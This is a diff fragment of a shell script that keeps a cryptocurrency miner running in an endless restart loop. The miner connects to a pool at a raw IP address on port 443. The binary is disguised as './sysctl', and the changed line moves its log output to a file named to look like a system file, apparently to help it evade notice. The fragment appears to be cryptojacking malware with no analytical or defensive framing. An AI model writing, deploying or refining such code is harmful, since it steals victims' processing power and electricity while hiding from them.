@@ -8,7 +8,7 @@ POOL_URL="stratum+tcp://$WALLET.$WORKER@89.187.28.197:443"
 # Infinite loop to restart the miner if it stops
 while true; do
   echo "Starting miner..."
-  ./sysctl --pool $POOL_URL --cpu-devices 0 >> 80.log 2>&1
+  ./sysctl --pool $POOL_URL --cpu-devices 0 >> proc.log 2>&1
 
   # Check exit code of miner
   EXIT_CODE=$?
